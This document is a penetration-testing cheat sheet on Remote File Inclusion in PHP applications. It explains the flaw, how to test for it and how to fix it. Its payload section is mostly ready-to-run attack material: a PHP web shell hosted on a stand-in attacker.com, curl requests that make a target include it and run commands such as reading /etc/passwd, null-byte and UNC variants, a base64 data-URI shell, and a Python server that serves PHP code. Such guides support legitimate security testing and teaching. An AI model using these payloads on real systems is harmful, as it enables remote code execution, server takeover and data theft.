# Remote File Inclusion (RFI)

## Overview
Remote File Inclusion (RFI) allows an attacker to include a file from a remote URL into the server-side execution context. If PHP's `allow_url_include` is enabled, an attacker can supply an external URL as the page parameter, causing the server to fetch and execute attacker-controlled PHP code. RFI directly leads to Remote Code Execution without requiring file write access to the server.

## How It Works
- Vulnerable PHP code: `include($_GET['page']);` or `include($_GET['file'] . '.php')`.
- With `allow_url_include=On` in `php.ini`, PHP fetches and includes remote URLs.
- Attacker hosts a PHP file at `http://attacker.com/shell.php` containing `<?php system($_GET['cmd']); ?>`.
- Attacker requests: `?page=http://attacker.com/shell.php`.
- The server fetches `attacker.com/shell.php` and executes its PHP code.
- RFI is less common in modern PHP (default `allow_url_include=Off` since PHP 5.2) but still exists in legacy apps.
- Also affects Ruby (ERB template injection from URL), Python (Jinja include from URL in some configs).

## Impact
- Direct Remote Code Execution — arbitrary OS commands.
- Full server compromise with no prerequisite file write access needed.
- Persistent backdoor deployment.
- Lateral movement to internal network.

## Where to Look
- Same as LFI: `page=`, `lang=`, `file=`, `template=`, `view=` parameters.
- PHP applications with `allow_url_include=On` (legacy applications, badly configured hosting).
- `php://`, `http://`, `https://`, `ftp://` schemes in inclusion parameters.
- Configuration management panels that load templates from URLs.

## Testing Steps
1. Test for RFI by supplying an external URL: `?page=http://external-site.com/test.txt`.
2. Check if the server makes a DNS/HTTP request to the external URL (use Burp Collaborator).
3. Use a Collaborator payload first: `?page=http://COLLABORATOR.burpcollaborator.net/test`.
4. If Collaborator receives a request, RFI is confirmed.
5. Host a PHP web shell and supply its URL as the page parameter.
6. Try FTP inclusion: `?page=ftp://attacker.com/shell.txt`.
7. Try `\\attacker.com\share\shell.php` (UNC path for Windows RFI).

## Payloads / Techniques
```bash
# Step 1: Test with OOB DNS request (Burp Collaborator)
curl -s "https://target.com/index.php?page=http://COLLABORATOR.burpcollaborator.net/rfi_test"
# Check if Collaborator receives a request — confirms URL inclusion is possible

# Step 2: Host a PHP web shell on attacker server
# On attacker.com, create shell.php:
cat << 'EOF' > /var/www/html/shell.php
<?php
if(isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd'] . ' 2>&1');
    echo "<pre>$output</pre>";
}
?>
EOF
# Start HTTP server: python3 -m http.server 80

# Step 3: Include the remote shell
curl -s "https://target.com/index.php?page=http://attacker.com/shell.php&cmd=id"
curl -s "https://target.com/index.php?page=http://attacker.com/shell.php&cmd=cat%20/etc/passwd"

# Try different URL schemes
curl -s "https://target.com/?page=https://attacker.com/shell.php"
curl -s "https://target.com/?page=ftp://attacker.com/shell.txt"

# Windows SMB path (UNC)
curl -s "https://target.com/?page=\\\\attacker.com\\share\\shell.php"

# Null byte bypass (append .php extension with null byte)
curl -s "https://target.com/?page=http://attacker.com/shell%00"
# Server includes http://attacker.com/shell (null terminates .php suffix)

# Check php.ini settings
curl -s "https://target.com/?page=http://attacker.com/phpinfo.php"
# If it renders phpinfo, check allow_url_include, allow_url_fopen values

# Data URI (as alternative to remote URL)
# PHP code in base64: <?php system($_GET['cmd']); ?>
B64=$(echo '<?php system($_GET["cmd"]); ?>' | base64 -w0)
curl -s "https://target.com/?page=data://text/plain;base64,$B64&cmd=id"
```

```python
# Set up a simple HTTP server with a PHP-like response for RFI testing
from http.server import BaseHTTPRequestHandler, HTTPServer

class RFIHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        # PHP code to execute
        self.wfile.write(b'<?php system("id"); ?>')
        print(f"Request from: {self.address_string()}")

server = HTTPServer(('0.0.0.0', 8000), RFIHandler)
print("RFI test server on port 8000")
server.serve_forever()
```

## Burp Suite Tips
- In **Repeater**, change the page parameter to an external URL (Burp Collaborator address first for blind detection).
- If Collaborator receives a callback, escalate to hosting an actual shell.
- **Active Scanner** (Pro) tests for RFI.
- In **Intruder**, use URL-based payloads as the file parameter value to fuzz for RFI.

## Tools
- Burp Collaborator (blind RFI detection)
- Python http.server (host malicious file)
- RFI scanner scripts (Nikto, WFuzz)

## Remediation
- Set `allow_url_include = Off` and `allow_url_fopen = Off` in `php.ini`.
- Apply the same whitelist-based approach as for LFI — never pass user input directly to include functions.
- Block outbound HTTP requests from web server processes using firewall rules (prevents fetching remote content).
- Use chroot jails and containers to limit file system scope.
- Perform regular `php.ini` audits to ensure these settings remain Off.

## References
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_File_Inclusion
https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/
https://portswigger.net/web-security/file-path-traversal
https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html
